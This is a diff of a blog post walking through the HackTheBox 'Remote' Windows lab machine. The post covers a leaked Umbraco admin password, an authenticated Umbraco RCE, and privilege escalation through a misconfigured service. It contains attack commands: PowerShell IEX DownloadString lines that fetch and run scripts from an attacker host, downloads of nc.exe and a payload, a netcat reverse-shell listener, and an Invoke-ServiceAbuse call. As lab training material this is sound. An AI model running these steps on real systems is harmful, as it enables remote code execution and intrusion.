@@ -3,11 +3,11 @@ layout: post
 title: HackTheBox Remote walkthrough
 gh-repo: c00rni/c00rni.github.io
 gh-badge: [star, fork, follow]
-tags: [enumeration, hackthebox, powercat, powerup, nfs, rpcbind, netcat, powershell, windows, msfvenom, oscp]
+tags: [enumeration, hackthebox, powercat, powerup, nfs, netcat, powershell, windows, msfvenom, oscp]
 comments: true
 ---
 
-Remote is a HacktheBox windows machine with the ip address 10.10.10.180. Rated as easy on the platform, this machine is highly [CVE](https://cve.mitre.org/about/cve_and_nvd_relationship.html) oriented and similar what you would encounter in an OSCP exam. I got a foothold on the machine using an authenticated remote code execution on the web server and elevate my privilege through an insecure file permission vulnerability. This box is fun and great to get familiar with windows privilege escalation.
+Remote is a HacktheBox windows machine with the ip address 10.10.10.180. Rated as easy on the platform, this machine is highly [CVE](https://cve.mitre.org/about/cve_and_nvd_relationship.html) oriented and similar of what you would encounter in an OSCP exam. I got a foothold on the machine using an authenticated remote code execution on the web server and elevate my privilege through an insecure file permission vulnerability. This box is fun and great to get familiar with windows privilege escalation.
 
 ![info_card.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/3b4dc061e2b548afb1e48a934e076f09.png)
 
@@ -32,7 +32,7 @@ A lot of ports were opened and the enumeration phase can be very time consuming 
 
 ### Port 80
 
-I found a login page using Umbraco CMS. Version 7.12.4 is vulnerable to an [authenticated remote code execution](https://www.exploit-db.com/exploits/46153).
+I found a login page using Umbraco CMS.
 
 ![umbraco_login_page.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/16a50ddcc8054aa5b2bb76c7e12826c8.png)
 
@@ -54,20 +54,20 @@ Found the file Umbraco database in a compact file format ([SDF](https://fileinfo
 
 ![found_umbraco.sdf.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8e6c12f1220145e49ab23e099404e464.png)
 
-Extracted the credentials from the raw data and decrypt the password hash [online](https://md5decrypt.net/Sha1/).
+I extracted the credentials from the raw data and decrypt the password hash [online](https://md5decrypt.net/Sha1/).
 
 ![database_content.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/889460b74eb44aa6881903bfcbceaa13.png)
 
 Clair text password:
-
 ```plaintext
 username: admin@htb.local
 password: baconandcheese 
 ```
 
+
 # Foothold
 
-I confirmed umbraco verson with `grep -iR "7.12.4"` and download [noraj umbraco poc](https://github.com/noraj/Umbraco-RCE). Since I didn't know what was the privileges of the user I was exploiting I executed the powercat.ps1 script without saving the file on the remode file system by combining the **DownloadString** methode with the Invoke-Expression cmdlet ([**IEX**](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6)).
+I found Umbraco CMS verson with `grep -iR "7.12.4"`. This version were vulnerable to an [authenticated remote code execution](https://www.exploit-db.com/exploits/46153) so I downloaded [noraj Umbraco POC](https://github.com/noraj/Umbraco-RCE). Since I didn't know what was the privileges of the user I was exploiting I executed the `powercat.ps1` script without saving the file on the remote file system by combining the **DownloadString** methode with the Invoke-Expression cmdlet ([**IEX**](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6)).
 
 Listen for connections:
 ```bash
@@ -107,10 +107,10 @@ powershell.exe
 cd c:\windows\temp
 ```
 
-HarmJ0y `PowerUp.ps1` script from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) github repository is a awnsome tool. It uses several tehcniques base on misconfugurations such as unquoted services paths ans improper permission on service executables to attent elevate privileges.
+HarmJ0y `PowerUp.ps1` script from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) github repository is an awnsome tool. It uses several tehcniques base on misconfugurations such as unquoted services paths and improper permission on service executables to attent elevate privileges.
 
 I upload PowerUp script into the server and executed Invoke-AllChecks function.
-```Powershell
+```powershell
 iex (New-Object System.Net.Webclient).DownloadString('http://X.X.X.X:8000/PowerUp.ps1')
 Invoke-AllChecks
 ```
@@ -126,12 +126,12 @@ powershell.exe -nop (New-Object System.Net.WebClient).DownloadFile('http://X.X.X
 powershell.exe -nop (New-Object System.Net.WebClient).DownloadFile('http://X.X.X.X:8000/nc.exe', 'c:\\Windows\\Temp\\nc.exe')
 ```
 
-And finaly open a port on your machine and execute `Invoke-serviceAbuse` function.
-Attacking machine:
+Open a port for reverse shell connections on my machine.
 ```bash
 sudo nc -lvnp 9001
 ```
-Server:
+
+And finaly executed `Invoke-ServiceAbuse` function to run the exploit.
 ```powershell
 Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'C:\Windows\Temp\evil.exe'
 ```
